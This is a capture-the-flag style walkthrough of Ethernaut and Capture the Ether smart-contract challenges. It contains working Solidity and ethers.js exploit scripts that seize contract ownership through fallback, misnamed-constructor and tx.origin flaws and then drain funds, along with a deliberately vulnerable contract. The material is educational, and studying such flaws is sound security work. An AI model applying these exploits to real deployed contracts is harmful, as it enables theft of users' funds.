[TOC]

# Etherenaut and Capture the Ether challenges

## Ethernaut #0 (hello ethernaut)

To warm up the selection of challanges in Ethernaut, this particular challenge is about triggering a series of methods in a specific order. The order is given by the hints of each read-only methods that the smart contracts suggests to call.

It all starts by calling `info()`, which returns `You will find what you need in info1().`

Once `info1()` is called, it returns `Try info2(), but with "hello" as a parameter.`

Once `info2("hello")` is called, it returns `The property infoNum holds the number of the next info method to call.`

Once `infoNum()` is called, it returns `42`. That gives us the hint to called the next method.

Once `info42()` is called, it returns `theMethodName is the name of the next method.`

Once `theMethodName()` is called, it returns `The method name is method7123949.`

Once `method7123949()` is called, it returns `If you know the password, submit it to authenticate().`

This message could be a bit strange because we don't actually know the password. However, by  carefully inspecting the smart contract, we find a variable named `password`. Let's inspect it:

```solidity
contract HelloEthernaut {
    string public password;
    // ...
    constructor(string memory _password) {
        password = _password;
    }
}
```

Even more, this variable is updated when the smart contract is deployed. Since the variable `password` has the keyword `public`, it means that the getter of the variable `password` has been implicitly defined and we are allow to retrieve it.

Once `password()` is called, we can store that in a variable:

```javascript
var passwordSmartContract = await helloEthernaut.password()
```

By following the last hint obtained, it tells us to submit to the `authenticate()` method.

Let's do that:

```javascript
await helloEthernaut.authenticate(passwordSmartContract);
```

Within the `authenticate` method from the smart contract, we find that if the password pass is the same as the one passed at deployment, the private variable `cleared` is changes from `false` to `true`.

There is specific method within the smart contract that helps us to verify whether this level was cleared or not. Let's call it:

```javascript
console.log("Is Smart Contract cleared?", await helloEthernaut.getCleared())
// true
```

The result from this must be true and that indicated that this level is passed.

## Ethernaut #1 (fallback)

The key point of this challenge is to become the `owner` of the contract. We should be able to trigger the method `withdraw()`,which is protected by the modifier `onlyOwner`, in order to drain all the funds in this smart contract.

While reviweing we find out that the `receive` method actually changes tha variable `owner` to be equal as the caller of the method. So we need to find a way to trigger it. 

The `receive` method is defined as follows:

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

For this to work, we need to pass the require successfully. That requires that aside from sending an amount of Ether, we need to be in the mapping of `contributions` so that `contributions[msg.sender] > 0` is `true`.

To achieve that, we could make use of another function called `contribute()` which is as follows:

```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```

As the `require` states, we need to send at most `0.001 Ether` in order to become part of the mapping `contributions`.

So far, we need to execute a couple methods from this smart contract: `contribute` and the `receive`.

Let's create an script to do just that:

```typescript
const [deployer] = await ethers.getSigners();

const Fallback = await ethers.getContractFactory("Fallback");
const fallback = await Fallback.deploy();
await fallback.deployed();

// calling contribute with 0.0001 Ether < 0.001 Ether
await fallback.contribute({ value: ethers.utils.parseEther("0.0001") });

// calling the receive
await deployer.sendTransaction({
  to: fallback.address,
  value: ethers.utils.parseEther("0.0001"),
})
```

Up until here, we have achieved changing the value of the variable `owner` to be equal to our address.

Now the modifier `onlyOwner` would not impede us to call it since our address has become the `owner` of the smart contract.

```javascript
await fallback.withdraw();
```

By calling withdraw, all the funds of the smart contract have been transferred to the owner, which is our address by now.

Let's check it:

```javascript
console.log("Balance:", await ethers.provider.getBalance(fallback.address));
// Balance: BigNumber { value: "0" }
```

And the balance is 0.

## Ethernaut #2 (fallout)

This challenge is based on a old version of solidity: `^0.6.0`. In this version, the constructor used to have a different implementation. Let's take a look:

```solidity
contract Fallout {
	// Constructor definition
	function Fallout() {}
}
```

As you can see, the keyword `constructor` was not used to define it. Instead, a function with that uses the very same Contract's name was used. Once the contract was deployed, this function constructor was automatically triggered.

However, there was a situation where some changed the contract's name without updating the function constructor's name. Once that happen, the function constructor becomes a simple method that could be called by anyone if there isn't any acces privilege associated with it.

```solidity
contract FallOut2 {
	// Just a regular function
	function Fallout() {}
}
```

By knowing this, we will be able to salve this particular challenge. Let's inspect the smart contract's challenge:

```solidity
contract Fallout {
	// constructor
	function Fal1out() public payable {
      owner = msg.sender;
      allocations[owner] = msg.value;
  }
  
  function collectAllocations() public onlyOwner {
  		msg.sender.transfer(address(this).balance);
  }
}
```

Notice the difference between `Fallout` and `Fal1out`. Since they are different, the suppouseddly contructor does not work as expected. `Fal1out` became a single function that could be called by anyone.

```javascript
const [deployer] = await ethers.getSigners();

const Fallout = await ethers.getContractFactory("Fallout");
const fallout = await Fallout.deploy();
await fallout.deployed();

// calling the suppouseddly 'constructor' function
// by doing this, the caller becomes the new owner
await fallout.Fal1out({ value: ethers.utils.parseEther("0.001") });

// veryfing the owner: true
console.log(
  "Did the owner changed?",
  (await fallout.owner()) == deployer.address
);

// Draining the contract's balance
// Method protected by the 'onlyOwner' modifier
await fallout.collectAllocations();

// Veryfing the balance
console.log("Balance:", await ethers.provider.getBalance(fallout.address));
// Balance: BigNumber { value: "0" }
```

We were able to drain all the smart contract funds by calling a simple function that used to be the construcor before someone changed the smart contract's name.

## Ethernaut #4 (telephone)

To understand this challenge, let's start by explaining the difference between `tx.origin` and `msg.sender`.

`tx.origin` will represent the account the initiates the transaction regardless of the amount of intercontract calls that are done in between.

However, `msg.sender` will always be the immediate account (externally owned or smart contract) that triggers the next call. If there are multiple calls between different smart contracts, `msg.sender` will keep changing at each call.

After that introduction, let's see where the `Telephone` smart contract is hackable.

```solidity
contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
		    // vulnerable operation
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

As long as we are able to make `tx.origin != msg.sender` true, we'll change update the variable `owner` to our benefit.

To achieve that, we need to make `tx.origin` and `msg.sender` to have different values. That needs to place a smart contract in between calls. `tx.origin` will represent the account that initiates the entire transaction. The smart contract in between, will be the one to call the `Telephone` smart contract. The smart contract in between will be `msg.sender`. By doing that, we have given `tx.origin` and `msg.sender` to be different in values.

Let's create the smart contract in between, which will be called `Hacker`:

```solidity
contract Hacker {
    Telephone public telephone;

    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}
```

Its main job will be to call the `Telephone` smart contract. In the `Hacker` smart contract, the method `attack` will be calling the `Telephone` smart contract. Therefore, the `Hacker` smart contract will become the `msg.sender` in the `Telephone` smart contract. Meanwhile, the account that calls the `attack` method will become `tx.origin`.

Let's create the scripts:

```javascript
const [deployer] = await ethers.getSigners();

const Telephone = await ethers.getContractFactory("Telephone");
const telephone = await Telephone.deploy();
await telephone.deployed();

// Deploying the 'Hacker' contract
const Hacker = await ethers.getContractFactory("Hacker");
const hacker = await Hacker.deploy(telephone.address);
await hacker.deployed();

// performing the attack
// 'changeOwner' method from `Telephone` smart contract is called
// here, 'tx.origin' is the deployer address
// while the `Hacker` smart contract will be 'msg.sender' within 'Telephone'
await hacker.attack();

// checking if the attack was successful
console.log(
  "Did the attack succeed?",
  (await telephone.owner()) == deployer.address
);
// true
```

For this particular kind of exploit when `tx.origin` is used, it is not recommended its use  for validating whether an account has been authorized or not.

## Capture The Ether: Guess the Number

The point of this challenge is to call the `guess` method from `GuessTheNumberChallenge` smart contract without errors. Let's review this method:

```solidity
pragma solidity ^0.4.21;

contract GuessTheNumberChallenge {
    uint8 answer = 42;

    function GuessTheNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```

Within the `guess` method, we need to pass an argument that will be checked internally. This argument is very clear (`uint8 answer = 42`) since it's defined at the first line of the smart contract. Also, inside the `guess` method, the smart contractd will attempt to send `2 ether` to whoever calls it; meaning that the smart contract must have that balance.

Let's review the scripts to make the call to the `guess` method successful:

```javascript
const GuessTheNumberChallenge = await ethers.getContractFactory(
  "GuessTheNumberChallenge"
);
// Deploying with 1 Eth
const guessTheNumberChallenge = await GuessTheNumberChallenge.deploy({
  value: ethers.utils.parseEther("1.0"),
});
await guessTheNumberChallenge.deployed();

var answer = 42;
// sending 'answer' and 1 Eth to the 'guess' method
await guessTheNumberChallenge.guess(answer, {
  value: ethers.utils.parseEther("1.0"),
});

console.log(await guessTheNumberChallenge.isComplete())
// true
```

By simply calling the `guess` method with `42` and sending `1 Eth`, we are able to drain all the funds from this smart contract (`isComplete() == true`).

## Ethernaut #3 (coinflip)

This challenge is related to the difficulties of finding a source or randomness in Ethereum. It's only possible to find pseudo random numbers in Ethereum since it is a deterministic Turing machine.

All the states within a smart contract (even the private variables) are public. That makes impossible to find a secure source of entropy. One might think that timestamps could be somehow useful, however, timestamps could be influenced by the miner. As long as the timestamp chosen by the miner is greater than its parent block, it's correct.
